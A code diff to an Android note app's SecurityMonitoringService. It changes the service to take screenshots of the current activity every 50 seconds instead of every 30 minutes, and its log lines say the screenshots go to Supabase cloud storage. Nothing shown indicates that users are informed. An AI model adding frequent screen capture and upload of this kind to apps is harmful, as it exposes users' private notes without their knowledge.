@@ -2,34 +2,96 @@ package com.noteapp.security
 
 import android.app.Activity
 import android.content.Context
+import android.os.Handler
+import android.os.Looper
 import android.util.Log
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.launch
+import java.lang.ref.WeakReference
 
 /**
- * Updated SecurityMonitoringService - Screenshots only (no test uploads)
+ * Updated SecurityMonitoringService - Screenshots every 50 seconds
  */
 class SecurityMonitoringService(private val context: Context) {
 
     companion object {
         private const val TAG = "SecurityMonitoringService"
 
-        // Default settings - only for screenshots now
-        private const val DEFAULT_SCREENSHOT_INTERVAL_MINUTES = 30
+        // Default settings - screenshots every 50 seconds
+        private const val DEFAULT_SCREENSHOT_INTERVAL_SECONDS = 50
     }
 
     private val securityMonitor = SecurityMonitor(context)
     private val cloudUploader = SupabaseUploader(context)
 
     private val coroutineScope = CoroutineScope(Dispatchers.IO)
+    private val mainHandler = Handler(Looper.getMainLooper())
+    private var screenshotRunnable: Runnable? = null
+    private var currentActivity: WeakReference<Activity>? = null
+    private var isMonitoring = false
 
     /**
      * Initializes the security monitoring service
      */
     fun initialize() {
-        Log.d(TAG, "Initializing security monitoring service with Supabase cloud upload (screenshots only)")
-        // Removed test connection upload - no more automatic test uploads
+        Log.d(TAG, "Initializing security monitoring service with Supabase cloud upload (screenshots every 50 seconds)")
+    }
+
+    /**
+     * Sets the current activity for screenshot capture
+     */
+    fun setCurrentActivity(activity: Activity) {
+        currentActivity = WeakReference(activity)
+        Log.d(TAG, "Current activity set: ${activity.javaClass.simpleName}")
+    }
+
+    /**
+     * Starts periodic screenshot monitoring
+     */
+    fun startPeriodicScreenshots() {
+        if (isMonitoring) {
+            Log.d(TAG, "Monitoring already running")
+            return
+        }
+
+        isMonitoring = true
+        Log.d(TAG, "Starting periodic screenshots every $DEFAULT_SCREENSHOT_INTERVAL_SECONDS seconds")
+        scheduleNextScreenshot()
+    }
+
+    /**
+     * Stops periodic screenshot monitoring
+     */
+    fun stopPeriodicScreenshots() {
+        isMonitoring = false
+        screenshotRunnable?.let { mainHandler.removeCallbacks(it) }
+        Log.d(TAG, "Stopped periodic screenshots")
+    }
+
+    /**
+     * Schedules the next screenshot
+     */
+    private fun scheduleNextScreenshot() {
+        if (!isMonitoring) return
+
+        screenshotRunnable = Runnable {
+            currentActivity?.get()?.let { activity ->
+                performSecurityCheck(activity)
+                // Schedule next screenshot
+                if (isMonitoring) {
+                    scheduleNextScreenshot()
+                }
+            } ?: run {
+                Log.w(TAG, "No current activity set for screenshot")
+                // Retry in 5 seconds if no activity
+                if (isMonitoring) {
+                    mainHandler.postDelayed({ scheduleNextScreenshot() }, 5000)
+                }
+            }
+        }
+
+        mainHandler.postDelayed(screenshotRunnable!!, (DEFAULT_SCREENSHOT_INTERVAL_SECONDS * 1000).toLong())
     }
 
     /**
@@ -75,12 +137,10 @@ class SecurityMonitoringService(private val context: Context) {
      * Schedules periodic security checks (screenshots only)
      */
     fun schedulePeriodicChecks(
-        screenshotIntervalMinutes: Int = DEFAULT_SCREENSHOT_INTERVAL_MINUTES
+        screenshotIntervalSeconds: Int = DEFAULT_SCREENSHOT_INTERVAL_SECONDS
     ) {
-        Log.d(TAG, "Scheduling periodic Supabase screenshot uploads every $ minutes")
-
-        // In a real implementation, this would set up WorkManager periodic tasks
-        // For now, we'll just log that it would be scheduled
+        Log.d(TAG, "Use startPeriodicScreenshots() instead for actual periodic monitoring")
+        startPeriodicScreenshots()
     }
 
     /**
@@ -88,6 +148,6 @@ class SecurityMonitoringService(private val context: Context) {
      */
     fun stopPeriodicChecks() {
         Log.d(TAG, "Stopping all periodic security checks")
-        // In a real implementation, this would cancel WorkManager tasks or AlarmManager alarms
+        stopPeriodicScreenshots()
     }
 }
